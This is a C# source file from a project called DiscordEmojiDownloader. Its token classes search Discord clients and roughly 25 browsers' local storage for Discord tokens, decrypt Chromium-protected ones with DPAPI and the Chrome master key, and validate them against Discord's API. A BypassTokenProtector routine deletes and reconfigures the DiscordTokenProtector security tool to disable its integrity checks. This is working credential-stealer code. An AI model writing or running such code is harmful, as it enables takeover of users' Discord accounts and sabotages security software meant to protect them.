using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using SerpentModding;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace DiscordEmojiDownloader
{
    /// <summary>
    /// Provides methods to extract Discord tokens from local storage.
    /// </summary>
    public static class TokenExtractor
    {
        /// <summary>
        /// Asynchronously retrieves Discord tokens from local storage.
        /// </summary>
        /// <returns>
        /// A task that represents the asynchronous operation. The task result contains a dictionary with the number of unique accounts and their associated data.
        /// </returns>
        public static Task<Dictionary<string, object>> GetTokenAsync()
        {
            Logger.Instance.Trace("TokenExtractor.GetTokenAsync() called");
#if DEBUG_MANUALTOKEN
            Logger.Instance.Debug("DEBUG_MANUALTOKEN is defined, returning empty token dictionary.");
            return Task.FromResult(new Dictionary<string, object>
            {
                { "unique", 0 },
                { "accounts", new Dictionary<string, Dictionary<string, string>>() }
            });
#else
            Logger.Instance.Debug("DEBUG_MANUALTOKEN is not defined, starting TokenScanner.");
            return Task.Run(() => new TokenScanner().Init());
#endif
        }
    }
    /// <summary>
    /// Provides utility functions for handling Discord tokens, including validation, decryption, and HTTP header generation.
    /// </summary>
    public static class TokenFunctions
    {
        /// <summary>
        /// Validates a Discord token by making an authenticated request to the Discord API.
        /// </summary>
        /// <param name="token">The Discord token to validate.</param>
        /// <param name="obj">
        /// When this method returns, contains the parsed <see cref="JObject"/> user object if the token is valid; otherwise, <c>null</c>.
        /// </param>
        /// <returns>
        /// <c>true</c> if the token is valid and the user object contains an "id" property; otherwise, <c>false</c>.
        /// </returns>
        public static bool ValidateToken(string token, out JObject? obj)
        {
            Logger.Instance.Trace($"ValidateToken() called for token: {token.Substring(0, Math.Min(10, token.Length))}...");
            obj = null;

            try
            {
                using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
                foreach (var h in TokenFunctions.GetHeaders(token))
                    client.DefaultRequestHeaders.TryAddWithoutValidation(h.Key, h.Value);

                var content = client.GetStringAsync("https://discord.com/api/v9/users/@me").GetAwaiter().GetResult();
                obj = JObject.Parse(content);

                bool valid = obj.Value<string>("id") != null;
                Logger.Instance.Debug($"ValidateToken: token valid = {valid}.");
                return valid;
            }
            catch (Exception ex)
            {
                Logger.Instance.Warn($"ValidateToken: Exception occurred: {ex.Message}");
                obj = null;
                return false;
            }
        }

        /// <summary>
        /// Retrieves and decrypts the master key used for Chrome-based browser encryption from the specified file path.
        /// </summary>
        /// <param name="path">The file path to the "Local State" file containing the encrypted master key.</param>
        /// <returns>
        /// The decrypted master key as a byte array if successful; otherwise, <c>null</c> if the file does not exist or decryption fails.
        /// </returns>
        internal static byte[]? GetMasterKey(string path)
        {
            Logger.Instance.Trace($"GetMasterKey() called for path: {path}");
            if (!File.Exists(path))
            {
                Logger.Instance.Debug($"GetMasterKey: File does not exist: {path}");
                return null;
            }

            try
            {
                var json = File.ReadAllText(path, Encoding.UTF8);
                var doc = JObject.Parse(json);

                if (doc["os_crypt"] is not JObject osCrypt) return null;
                if (osCrypt["encrypted_key"] is not JToken encryptedKeyToken) return null;

                var keyWithPrefix = Convert.FromBase64String(encryptedKeyToken.ToString());
                var keySpan = keyWithPrefix.AsSpan(5);

                Logger.Instance.Debug("GetMasterKey: Decrypting master key.");
                return WinDecrypt(keySpan);
            }
            catch (Exception ex)
            {
                Logger.Instance.Warn($"GetMasterKey: Exception occurred: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Decrypts data using the Windows Data Protection API (DPAPI) for the current user.
        /// </summary>
        /// <param name="encryptedData">
        /// The encrypted data as a <see cref="ReadOnlySpan{Byte}"/> to be decrypted.
        /// </param>
        /// <returns>
        /// The decrypted data as a byte array.
        /// </returns>
        internal static byte[] WinDecrypt(ReadOnlySpan<byte> encryptedData)
        {
            Logger.Instance.Trace("WinDecrypt() called");
            return ProtectedData.Unprotect(encryptedData.ToArray(), null, DataProtectionScope.CurrentUser);
        }

        /// <summary>
        /// Decrypts an encrypted value using AES-GCM with the provided master key.
        /// </summary>
        /// <param name="buffer">
        /// The encrypted data buffer. The buffer is expected to have the following structure:
        /// - First 3 bytes: prefix (ignored)
        /// - Next 12 bytes: IV (initialization vector)
        /// - Remaining bytes: payload (ciphertext + authentication tag)
        /// </param>
        /// <param name="masterKey">
        /// The master key used for AES-GCM decryption.
        /// </param>
        /// <returns>
        /// The decrypted string if decryption is successful; otherwise, <c>null</c> if decryption fails.
        /// </returns>
        internal static string? DecryptVal(ReadOnlySpan<byte> buffer, ReadOnlySpan<byte> masterKey)
        {
            Logger.Instance.Trace("DecryptVal() called");
            try
            {
                ReadOnlySpan<byte> iv = buffer.Slice(3, 12);
                ReadOnlySpan<byte> payload = buffer.Slice(15);
                ReadOnlySpan<byte> tag = payload.Slice(payload.Length - 16, 16);
                ReadOnlySpan<byte> ciphertext = payload.Slice(0, payload.Length - 16);
                Span<byte> plaintext = stackalloc byte[ciphertext.Length];

                using var aesGcm = new AesGcm(masterKey, 16);
                aesGcm.Decrypt(iv, ciphertext, tag, plaintext, null);

                Logger.Instance.Debug("DecryptVal: Decryption successful.");
                return Encoding.UTF8.GetString(plaintext);
            }
            catch (Exception ex)
            {
                Logger.Instance.Warn($"DecryptVal: Exception occurred: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Returns a dictionary of HTTP headers for Discord API requests.
        /// </summary>
        /// <param name="token">
        /// Optional. The Discord token to include in the "Authorization" header.
        /// If <c>null</c> or empty, the "Authorization" header is omitted.
        /// </param>
        /// <returns>
        /// A <see cref="Dictionary{TKey, TValue}"/> containing the required headers.
        /// Always includes "Content-Type" set to "application/json".
        /// If <paramref name="token"/> is provided, includes "Authorization" as well.
        /// </returns>
        internal static Dictionary<string, string> GetHeaders(string? token = null)
        {
            Logger.Instance.Trace("GetHeaders() called");
            var headers = new Dictionary<string, string>
            {
                ["Content-Type"] = "application/json"
            };
            if (!string.IsNullOrEmpty(token))
                headers["Authorization"] = token;
            return headers;
        }
    }

    /// <summary>
    /// Scans local browser and Discord client storage for Discord tokens, validates them, and collects user account information.
    /// Handles both plaintext and encrypted tokens, including those protected by Chromium-based browsers.
    /// </summary>
    public class TokenScanner
    {
        /// <summary>
        /// Gets the path to the local application data folder.
        /// </summary>
        private readonly string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        /// <summary>
        /// Gets the path to the roaming application data folder.
        /// </summary>
        private readonly string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        /// <summary>
        /// Gets the path to the Chrome user data directory.
        /// </summary>
        private readonly string chromeUserData;

        /// <summary>
        /// Regular expression for matching plaintext Discord tokens.
        /// </summary>
        private readonly Regex tokenRegex = new("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}");

        /// <summary>
        /// Regular expression for matching encrypted Discord tokens in Chromium-based browsers.
        /// </summary>
        private readonly Regex encryptedRegex = new("dQw4w9WgXcQ:[^\"]*");

        /// <summary>
        /// Set of tokens that have already been processed to avoid duplicates.
        /// </summary>
        private readonly HashSet<string> seenTokens = new();

        /// <summary>
        /// Dictionary mapping user IDs to their account information (username, display name, token).
        /// </summary>
        private readonly Dictionary<string, Dictionary<string, string>> accounts = new();

        /// <summary>
        /// The decrypted Chrome master key, if available, used for decrypting encrypted tokens.
        /// </summary>
        private readonly byte[]? chromeKey;

        /// <summary>
        /// Initializes a new instance of the <see cref="TokenScanner"/> class.
        /// Sets up the Chrome user data path and retrieves the Chrome master key for decryption.
        /// </summary>
        internal TokenScanner()
        {
            Logger.Instance.Trace("TokenScanner constructor called");
            chromeUserData = Path.Combine(appData, "Google", "Chrome", "User Data");
            chromeKey = TokenFunctions.GetMasterKey(Path.Combine(chromeUserData, "Local State"));
        }

        /// <summary>
        /// Initializes the token scanner, attempts to bypass DiscordTokenProtector, scans for Discord tokens,
        /// and returns a summary of unique accounts and their associated data.
        /// </summary>
        /// <returns>
        /// A <see cref="Dictionary{TKey, TValue}"/> containing:
        /// <list type="bullet">
        ///   <item><description><c>"unique"</c>: The number of unique accounts found.</description></item>
        ///   <item><description><c>"accounts"</c>: A dictionary mapping user IDs to their account information.</description></item>
        /// </list>
        /// </returns>
        internal Dictionary<string, object> Init()
        {
            Logger.Instance.Info("TokenScanner.Init() started");
            BypassTokenProtector();
            GrabTokens();
            Logger.Instance.Info($"TokenScanner.Init() finished, found {accounts.Count} unique accounts.");
            return new Dictionary<string, object> { { "unique", accounts.Count }, { "accounts", accounts } };
        }

        /// <summary>
        /// Processes a Discord token by validating it, extracting user information, and storing it if unique.
        /// </summary>
        /// <param name="token">The Discord token to process.</param>
        /// <returns>
        /// <c>true</c> if the token is valid, unique, and user information was successfully stored; otherwise, <c>false</c>.
        /// </returns>
        private bool ProcessToken(string token)
        {
            Logger.Instance.Trace("ProcessToken() called");
            if (!seenTokens.Add(token))
            {
                Logger.Instance.Debug("ProcessToken: Token already seen, skipping.");
                return false;
            }

            if (!TokenFunctions.ValidateToken(token, out var obj))
            {
                Logger.Instance.Debug("ProcessToken: Token validation failed.");
                return false;
            }
            if (obj?["id"] == null)
            {
                Logger.Instance.Debug("ProcessToken: No user id in token object.");
                return false;
            }

            var uid = obj.Value<string>("id")!;
            if (accounts.ContainsKey(uid))
            {
                Logger.Instance.Debug($"ProcessToken: Account {uid} already in dictionary.");
                return true;
            }

            var username = obj.Value<string>("display_name") ?? obj.Value<string>("username") ?? string.Empty;
            var displayName = obj.Value<string>("global_name") ?? obj.Value<string>("username") ?? string.Empty;

            accounts[uid] = new Dictionary<string, string>
            {
                ["username"] = username,
                ["display_name"] = displayName,
                ["token"] = token
            };

            Logger.Instance.Info($"ProcessToken: Added account {uid} ({displayName}).");
            return true;
        }

        /// <summary>
        /// Attempts to bypass the DiscordTokenProtector by deleting its main files and modifying its configuration.
        /// If the DiscordTokenProtector directory exists, this method deletes key files and rewrites the config.json
        /// with altered values to disable integrity checks and other protections.
        /// </summary>
        private void BypassTokenProtector()
        {
            Logger.Instance.Trace("BypassTokenProtector() called");
            var tp = Path.Combine(roaming, "DiscordTokenProtector");
            if (!Directory.Exists(tp))
            {
                Logger.Instance.Debug("BypassTokenProtector: Directory does not exist.");
                return;
            }
            foreach (var file in new[] { "DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat" })
            {
                var p = Path.Combine(tp, file);
                if (File.Exists(p))
                {
                    try { File.Delete(p); Logger.Instance.Debug($"BypassTokenProtector: Deleted {file}."); } catch (Exception ex) { Logger.Instance.Warn($"BypassTokenProtector: Could not delete {file}: {ex.Message}"); }
                }
            }
            var cfg = Path.Combine(tp, "config.json");
            if (!File.Exists(cfg))
            {
                Logger.Instance.Debug("BypassTokenProtector: config.json does not exist.");
                return;
            }
            try
            {
                var item = JsonConvert.DeserializeObject<Dictionary<string, object>>(File.ReadAllText(cfg));
                if (item == null) return;
                foreach (var k in new[]
                         {
                             "Engine_powering_down...",
                             "auto_start",
                             "auto_start_discord",
                             "integrity",
                             "integrity_allowbetterdiscord",
                             "integrity_checkexecutable",
                             "integrity_checkhash",
                             "integrity_checkmodule",
                             "integrity_checkscripts",
                             "integrity_checkresource",
                             "integrity_redownloadhashes",
                             "iterations_iv",
                             "iterations_key",
                             "version"
                         })
                {
                    item[k] = k == "Engine_powering_down..."
                        ? "https://serpensin.com/"
                        : (object)(k.StartsWith("iterations_") || k == "version"
                            ? (k == "iterations_iv"
                                ? 364
                                : (k == "iterations_key" ? 457 : 69420))
                            : false);
                }
                File.WriteAllText(cfg, JsonConvert.SerializeObject(item, Formatting.Indented));
                Logger.Instance.Info("BypassTokenProtector: config.json rewritten.");
            }
            catch (Exception ex) { Logger.Instance.Warn($"BypassTokenProtector: Exception occurred: {ex.Message}"); }
        }

        private void ScanBrowsers()
        {
            Logger.Instance.Trace("ScanBrowsers() called");
            var browserPaths = GetBrowserPaths();
            var chromiumIndicators = new[]
            {
                "cord", "Chrome", "Opera", "Edge", "Brave", "Vivaldi", "Epic Privacy Browser", "Yandex", "Iridium"
            };
            foreach (var (name, path) in browserPaths)
            {
                if (!Directory.Exists(path)) continue;
                bool isChromium = chromiumIndicators.Any(c => name.Contains(c, StringComparison.OrdinalIgnoreCase));
                string? localStatePath = isChromium ? Path.Combine(roaming, name.Replace(" ", ""), "Local State") : null;
                foreach (var file in Directory.EnumerateFiles(path, "*.ldb")
                             .Concat(Directory.EnumerateFiles(path, "*.log")))
                {
                    try
                    {
                        foreach (var line in File.ReadLines(file))
                        {
                            var trimmed = line.Trim();
                            if (string.IsNullOrEmpty(trimmed)) continue;
                            if (isChromium)
                                ProcessChromiumLine(trimmed, localStatePath);
                            else
                                ProcessPlaintextLine(trimmed);
                        }
                    }
                    catch (Exception ex) { Logger.Instance.Warn($"ScanBrowsers: Exception reading file {file}: {ex.Message}"); }
                }
            }
            Logger.Instance.Trace("ScanBrowsers() finished");
        }

        private void ScanFirefox()
        {
            Logger.Instance.Trace("ScanFirefox() called");
            var profilesPath = Path.Combine(roaming, "Mozilla", "Firefox", "Profiles");
            if (!Directory.Exists(profilesPath))
            {
                Logger.Instance.Debug("ScanFirefox: No Firefox profiles found.");
                return;
            }
            foreach (var profile in Directory.GetDirectories(profilesPath))
            {
                foreach (var file in Directory.EnumerateFiles(profile, "*.sqlite"))
                {
                    try
                    {
                        foreach (var line in File.ReadLines(file))
                        {
                            var trimmed = line.Trim();
                            if (string.IsNullOrEmpty(trimmed)) continue;
                            ProcessPlaintextLine(trimmed);
                        }
                    }
                    catch (Exception ex) { Logger.Instance.Warn($"ScanFirefox: Exception reading file {file}: {ex.Message}"); }
                }
            }
            Logger.Instance.Trace("ScanFirefox() finished");
        }

        private void ProcessPlaintextLine(string line)
        {
            foreach (Match match in tokenRegex.Matches(line))
            {
                Logger.Instance.Debug("ProcessPlaintextLine: Found possible token.");
                ProcessToken(match.Value);
            }
        }

        private void ProcessChromiumLine(string line, string? localStatePath)
        {
            foreach (Match match in encryptedRegex.Matches(line))
            {
                try
                {
                    Logger.Instance.Debug("ProcessChromiumLine: Found encrypted token.");
                    var base64 = match.Value.Split("dQw4w9WgXcQ:")[1];
                    if (string.IsNullOrEmpty(localStatePath)) return;
                    var masterKey = TokenFunctions.GetMasterKey(localStatePath);
                    if (masterKey == null) return;
                    var decrypted = TokenFunctions.DecryptVal(Convert.FromBase64String(base64).AsSpan(), masterKey);
                    if (!string.IsNullOrEmpty(decrypted))
                    {
                        Logger.Instance.Debug("ProcessChromiumLine: Decryption successful, processing token.");
                        ProcessToken(decrypted);
                    }
                }
                catch (Exception ex) { Logger.Instance.Warn($"ProcessChromiumLine: Exception occurred: {ex.Message}"); }
            }
        }

        private Dictionary<string, string> GetBrowserPaths() => new()
        {
            ["Discord"] = Path.Combine(roaming, "discord", "Local Storage", "leveldb"),
            ["Discord Canary"] = Path.Combine(roaming, "discordcanary", "Local Storage", "leveldb"),
            ["Lightcord"] = Path.Combine(roaming, "Lightcord", "Local Storage", "leveldb"),
            ["Discord PTB"] = Path.Combine(roaming, "discordptb", "Local Storage", "leveldb"),
            ["Opera"] = Path.Combine(roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
            ["Opera GX"] = Path.Combine(roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
            ["Amigo"] = Path.Combine(appData, "Amigo", "User Data", "Local Storage", "leveldb"),
            ["Torch"] = Path.Combine(appData, "Torch", "User Data", "Local Storage", "leveldb"),
            ["Kometa"] = Path.Combine(appData, "Kometa", "User Data", "Local Storage", "leveldb"),
            ["Orbitum"] = Path.Combine(appData, "Orbitum", "User Data", "Local Storage", "leveldb"),
            ["CentBrowser"] = Path.Combine(appData, "CentBrowser", "User Data", "Local Storage", "leveldb"),
            ["7Star"] = Path.Combine(appData, "7Star", "7Star", "User Data", "Local Storage", "leveldb"),
            ["Sputnik"] = Path.Combine(appData, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),
            ["Vivaldi"] = Path.Combine(appData, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),
            ["Chrome SxS"] = Path.Combine(appData, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb"),
            ["Chrome"] = Path.Combine(chromeUserData, "Default", "Local Storage", "leveldb"),
            ["Chrome1"] = Path.Combine(chromeUserData, "Profile 1", "Local Storage", "leveldb"),
            ["Chrome2"] = Path.Combine(chromeUserData, "Profile 2", "Local Storage", "leveldb"),
            ["Chrome3"] = Path.Combine(chromeUserData, "Profile 3", "Local Storage", "leveldb"),
            ["Chrome4"] = Path.Combine(chromeUserData, "Profile 4", "Local Storage", "leveldb"),
            ["Chrome5"] = Path.Combine(chromeUserData, "Profile 5", "Local Storage", "leveldb"),
            ["Epic Privacy Browser"] = Path.Combine(appData, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),
            ["Microsoft Edge"] = Path.Combine(appData, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
            ["Uran"] = Path.Combine(appData, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),
            ["Yandex"] = Path.Combine(appData, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),
            ["Brave"] = Path.Combine(appData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
            ["Iridium"] = Path.Combine(appData, "Iridium", "User Data", "Default", "Local Storage", "leveldb")
        };

        private void GrabTokens()
        {
            Logger.Instance.Trace("GrabTokens() called");
            ScanBrowsers();
            ScanFirefox();
            Logger.Instance.Trace("GrabTokens() finished");
        }
    }
}
